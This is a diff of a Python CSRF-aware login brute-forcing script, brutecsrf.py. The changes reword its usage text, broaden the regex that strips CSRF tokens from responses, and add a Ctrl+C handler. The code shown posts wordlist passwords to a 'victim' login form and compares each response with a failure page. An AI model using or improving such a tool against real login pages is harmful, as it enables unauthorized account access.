@@ -26,7 +26,7 @@ def creds():
     print(colored("GitHub: https://github.com/J3wker\n\n", 'green'))
 
 def parse():
-    parser = argparse.ArgumentParser(description='[+] Usage: ./brutecsrf.py --url http://test.com  --csrf centreon_token --u admin \n | NOTE: If some field doesnt have a name set it as "" ')
+    parser = argparse.ArgumentParser(description='[+] Usage: ./brutecsrf.py --url http://test.com  --csrf centreon_token --u admin \n | NOTE: If a field dont have a name - set them as "" ')
     parser.add_argument('--url', dest="target_url", help='Victim Website')
     parser.add_argument('--csrf', dest="csrf", help=' csrf name in HTTP form')
     parser.add_argument('--u', "--user", dest="username", help=' username you are brute forcing')
@@ -111,7 +111,7 @@ def url_request(username):
             response = requests.post(target_url, data=data, cookies=cookie)
             response = (str(response.content))
             response = response.replace(f'value="{word}"', 'value="omri"')  # Replacing the password field with the word 'omri' so we can compare it to wrong response
-            response = re.sub(f'(?:"{csrf}" type="hidden" value=")(.*)(?:" />)', "omri", response)  # Replacing the CSRF token with 'omri' so we can comapre it to the wrong response
+            response = re.sub(f'(?:<.* name="{csrf}" .* value=")(.*)(?:" />)', "omri", response)  # Replacing the CSRF token with 'omri' so we can comapre it to the wrong response
 
             if response != wrong:
                 print("Trying : " + word)
@@ -150,6 +150,10 @@ try:
 
     # program actual run time
     url_request(user)
+
+except KeyboardInterrupt:
+    print(colored("\n\n[-] Detected Ctrl + C ... Program Existed", "red"))
+    exit()
 
 except Exception:
     print(colored("[-] Something went wrong - check wordlist path OR request timed out", "red"))
